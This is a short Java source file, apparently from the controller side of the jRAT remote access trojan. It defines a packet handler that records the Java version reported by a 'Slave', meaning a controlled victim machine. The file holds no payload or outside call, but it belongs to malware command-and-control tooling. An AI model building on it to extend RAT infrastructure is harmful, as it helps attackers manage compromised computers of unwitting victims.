package pro.jrat.packets.incoming;

import java.io.DataInputStream;

import pro.jrat.Slave;


public class Packet25InitJavaVersion extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String version = slave.readLine();
		slave.setJavaVersion(version);
	}
}
